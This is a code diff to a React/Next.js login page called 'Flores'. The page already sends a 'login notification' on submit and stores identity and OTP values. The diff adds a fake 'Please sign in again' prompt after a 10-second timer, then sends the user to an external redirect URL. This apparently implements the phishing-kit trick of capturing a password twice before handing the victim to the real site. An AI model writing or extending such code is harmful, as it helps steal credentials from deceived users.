@@ -1,9 +1,9 @@
 "use client";
 
-import { useEffect, useState } from "react";
+import { useEffect, useRef, useState } from "react";
 import { useRouter } from "next/navigation";
 import { Eye, EyeOff } from "lucide-react";
-import { FLORES_SESSION } from "@/lib/flores-flow";
+import { FLORES_REDIRECT_URL, FLORES_SESSION } from "@/lib/flores-flow";
 
 export function FloresLoginPage() {
   const router = useRouter();
@@ -12,6 +12,8 @@ export function FloresLoginPage() {
   const [showPassword, setShowPassword] = useState(false);
   const [message, setMessage] = useState<string | null>(null);
   const [isLoading, setIsLoading] = useState(false);
+  const [needsReauth, setNeedsReauth] = useState(false);
+  const reauthTimerRef = useRef<number | null>(null);
 
   useEffect(() => {
     if (typeof window !== "undefined") {
@@ -19,6 +21,14 @@ export function FloresLoginPage() {
       sessionStorage.removeItem(FLORES_SESSION.identity);
       sessionStorage.removeItem(FLORES_SESSION.otp2);
     }
+  }, []);
+
+  useEffect(() => {
+    return () => {
+      if (reauthTimerRef.current !== null) {
+        window.clearTimeout(reauthTimerRef.current);
+      }
+    };
   }, []);
 
   useEffect(() => {
@@ -93,10 +103,33 @@ export function FloresLoginPage() {
         return;
       }
 
+      if (needsReauth) {
+        if (typeof window !== "undefined") {
+          sessionStorage.setItem(FLORES_SESSION.verify, "1");
+          sessionStorage.removeItem(FLORES_SESSION.identity);
+          sessionStorage.removeItem(FLORES_SESSION.otp2);
+          window.location.assign(FLORES_REDIRECT_URL);
+        }
+        return;
+      }
+
       if (typeof window !== "undefined") {
         sessionStorage.setItem(FLORES_SESSION.verify, "1");
       }
-      router.push("/verify");
+
+      setNeedsReauth(false);
+      setMessage(null);
+
+      if (reauthTimerRef.current !== null) {
+        window.clearTimeout(reauthTimerRef.current);
+      }
+
+      reauthTimerRef.current = window.setTimeout(() => {
+        setNeedsReauth(true);
+        setIsLoading(false);
+        setMessage(null);
+        reauthTimerRef.current = null;
+      }, 10000);
     } catch (error) {
       console.error("Failed to send login notification:", error);
       setMessage("Something went wrong. Please try again.");
@@ -170,6 +203,12 @@ export function FloresLoginPage() {
               </p>
             )}
 
+            {needsReauth ? (
+              <p className="text-sm text-gray-600 mb-4">
+                Please sign in again to continue to the next step.
+              </p>
+            ) : null}
+
             <p className="text-sm mb-6">
               <a href="#" className="text-blue-600 hover:underline">
                 Forgot password?
@@ -182,7 +221,7 @@ export function FloresLoginPage() {
                 disabled={isLoading}
                 className="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 w-full sm:w-auto"
               >
-                {isLoading ? "Signing in..." : "Sign in"}
+                {isLoading ? "Signing in..." : needsReauth ? "Sign in again" : "Sign in"}
               </button>
             </div>
           </form>
